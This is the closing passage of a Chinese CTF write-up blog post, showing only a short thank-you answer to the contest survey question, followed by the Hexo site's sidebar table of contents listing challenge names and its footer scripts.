<h3 id="问卷题"><a href="#问卷题" class="headerlink" title="问卷题"></a>问卷题</h3><p>这场比赛很有意思，这个是毋庸置疑的，而且也很能够引导我们的学习，感谢各位师傅举办了这么精彩的比赛，我们明年还会来参加的，师傅们明年见</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E8%B5%9B%E9%A2%98/" rel="tag"># 赛题</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2025/05/23/NSS%E4%B8%8A%E7%9A%84%E6%95%A3%E9%A2%98%E9%A2%98%E5%8D%95%E5%90%88%E9%9B%86/" rel="prev" title="NSS上的散题题单合集">
      <i class="fa fa-chevron-left"></i> NSS上的散题题单合集
    </a></div>
      <div class="post-nav-item">
    <a href="/2025/06/02/d-3CTF%E5%B0%8F%E7%99%BB%E9%A2%98%E8%A7%A3/" rel="next" title="d^3CTF小登题解">
      d^3CTF小登题解 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%98%9F%E6%84%BF%E4%BF%A1%E7%AE%B1"><span class="nav-number">1.1.</span> <span class="nav-text">星愿信箱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nest-js"><span class="nav-number">1.2.</span> <span class="nav-text">nest_js</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re"><span class="nav-number">2.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-rc4"><span class="nav-number">2.1.</span> <span class="nav-text">easy_rc4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pickle"><span class="nav-number">2.2.</span> <span class="nav-text">pickle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-tea"><span class="nav-number">2.3.</span> <span class="nav-text">easy_tea</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98-basic"><span class="nav-number">3.1.</span> <span class="nav-text">第一题:basic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-math"><span class="nav-number">3.2.</span> <span class="nav-text">ez_math</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#math"><span class="nav-number">3.3.</span> <span class="nav-text">math</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby"><span class="nav-number">3.4.</span> <span class="nav-text">baby</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">4.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#test-your-nc"><span class="nav-number">4.1.</span> <span class="nav-text">test_your_nc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%81%B5%E6%84%9F%E8%8F%87%F0%9F%8D%84%E5%93%A9%E8%8F%87%E5%93%A9%E8%8F%87%E5%93%A9%E5%93%87%E6%93%A6%E7%81%B5%E6%84%9F%E8%8F%87%E7%81%B5%E6%84%9F%E8%8F%87%F0%9F%8D%84"><span class="nav-number">5.1.</span> <span class="nav-text">灵感菇🍄哩菇哩菇哩哇擦灵感菇灵感菇🍄</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cropping"><span class="nav-number">5.2.</span> <span class="nav-text">Cropping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%83%8F%E7%B4%A0%E4%B8%AD%E7%9A%84%E8%88%AA%E7%8F%AD"><span class="nav-number">5.3.</span> <span class="nav-text">像素中的航班</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%88%E5%A4%B1%E7%9A%84%E6%96%87%E5%AD%97"><span class="nav-number">5.4.</span> <span class="nav-text">消失的文字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E5%8D%B7%E9%A2%98"><span class="nav-number">5.5.</span> <span class="nav-text">问卷题</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="3a0-Eminem"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">3a0-Eminem</p>
  <div class="site-description" itemprop="description">No Human is Limited</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="mailto:eminemgcxwlp@gmail.com" title="E-Mail → mailto:eminemgcxwlp@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2025\4\21 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">3a0-Eminem</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>


  











<script>
document.querySelectorAll('.pdfobject-container').forEach(element => {
  let url = element.dataset.target;
  let pdfOpenParams = {
    navpanes : 0,
    toolbar  : 0,
    statusbar: 0,
    pagemode : 'thumbs',
    view     : 'FitH'
  };
  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;

  if (NexT.utils.supportsPDFs()) {
    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
  } else {
    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
  }
});
</script>




  

  

</body>
</html>
